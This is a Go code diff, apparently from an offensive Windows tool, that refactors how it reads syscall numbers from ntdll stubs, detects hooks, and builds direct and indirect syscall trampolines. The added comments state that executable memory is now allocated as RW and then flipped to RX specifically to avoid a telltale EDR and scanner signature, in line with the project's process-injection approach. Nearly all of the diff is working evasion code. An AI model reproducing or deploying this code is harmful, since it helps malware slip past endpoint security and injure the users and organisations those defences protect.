@@ -83,48 +83,26 @@ func resolveSyscallInfo(name string) (syscallInfo, error) {
 		return syscallInfo{}, fmt.Errorf("解析 %s: %v", name, err)
 	}
 	body := (*[64]byte)(unsafe.Pointer(p.Addr()))
-	// mov r10, rcx (4c 8b d1) | mov eax, imm32 (b8 xx xx xx xx) | syscall (0f 05) | ret (c3)
-	if body[0] != 0x4C || body[1] != 0x8B || body[2] != 0xD1 {
-		return syscallInfo{}, fmt.Errorf("%s 函数体前缀异常（可能已 hook）: %x %x %x", name, body[0], body[1], body[2])
+	ssn, syscallAddr, err := ParseSyscallStub(body[:], p.Addr())
+	if err != nil {
+		return syscallInfo{}, fmt.Errorf("%s: %w", name, err)
 	}
-	if body[3] != 0xB8 {
-		return syscallInfo{}, fmt.Errorf("%s 未找到 mov eax,imm（可能已 hook）", name)
-	}
-	ssn := uintptr(body[4]) | uintptr(body[5])<<8 | uintptr(body[6])<<16 | uintptr(body[7])<<24
-	// syscall 指令 = mov eax 之后 3 字节（0f 05 为 2 字节，ret 在其后）：
-	// 常规 stub: 4c 8b d1 | b8 imm32 | 0f 05 | c3
-	if body[8] != 0x0F || body[9] != 0x05 {
-		return syscallInfo{}, fmt.Errorf("%s 未找到 syscall 指令", name)
-	}
-	return syscallInfo{
-		ssn:         ssn,
-		syscallAddr: p.Addr() + 8,
-	}, nil
+	return syscallInfo{ssn: uintptr(ssn), syscallAddr: syscallAddr}, nil
 }
 
-// buildTrampoline 构建可执行 trampoline：
-//   direct:   4c 8b d1 | b8 <ssn> | 0f 05 | c3
-//   indirect: 4c 8b d1 | b8 <ssn> | e9 <rel32>（jmp ntdll syscall 指令）
+// buildTrampoline 分配可执行内存并写入 trampoline 机器码。
+//
+// 内存权限按"先写后执行"两段走：VirtualAlloc(RW) → 写码 → VirtualProtect(RX)。
+// 原实现直接分配 PAGE_EXECUTE_READWRITE —— 一块 RWX 内存本身就是 EDR/扫描器
+// 最醒目的特征之一，也与本项目"注入走 RW→RX"的原则自相矛盾。
 func buildTrampoline(mode string, info syscallInfo) (uintptr, error) {
-	var code []byte
-	if mode == "direct" {
-		code = []byte{
-			0x4C, 0x8B, 0xD1, // mov r10, rcx
-			0xB8, byte(info.ssn), byte(info.ssn >> 8), byte(info.ssn >> 16), byte(info.ssn >> 24), // mov eax, ssn
-			0x0F, 0x05, // syscall
-			0xC3, // ret
-		}
-	} else { // indirect
-		code = []byte{
-			0x4C, 0x8B, 0xD1,
-			0xB8, byte(info.ssn), byte(info.ssn >> 8), byte(info.ssn >> 16), byte(info.ssn >> 24),
-			0xE9, 0, 0, 0, 0, // jmp rel32
-		}
-		// rel32 = syscallAddr - (trampoline + 5)  —— 先分配后回填
+	code, err := BuildTrampoline(mode, uint32(info.ssn), info.syscallAddr)
+	if err != nil {
+		return 0, err
 	}
-	// 可执行内存分配（RWX 小块 trampoline）
-	size := uintptr(len(code) + 8)
-	base, err := windows.VirtualAlloc(0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	size := uintptr(len(code))
+	// 1) 先要 RW：只写不执行
+	base, err := windows.VirtualAlloc(0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil || base == 0 {
 		return 0, fmt.Errorf("VirtualAlloc trampoline: %v", err)
 	}
@@ -132,15 +110,11 @@ func buildTrampoline(mode string, info syscallInfo) (uintptr, error) {
 	for i, b := range code {
 		dst[i] = b
 	}
-	if mode == "indirect" {
-		// 回填 jmp rel32：target = syscallAddr
-		target := int64(info.syscallAddr)
-		from := int64(base + 10) // jmp(5 字节)下一条指令地址 = base+5+5
-		rel := target - from
-		dst[6] = byte(rel)
-		dst[7] = byte(rel >> 8)
-		dst[8] = byte(rel >> 16)
-		dst[9] = byte(rel >> 24)
+	// 2) 再降为 RX：执行期不可写（W^X）
+	var oldProtect uint32
+	if err := windows.VirtualProtect(base, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
+		_ = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		return 0, fmt.Errorf("VirtualProtect trampoline: %v", err)
 	}
 	return base, nil
 }
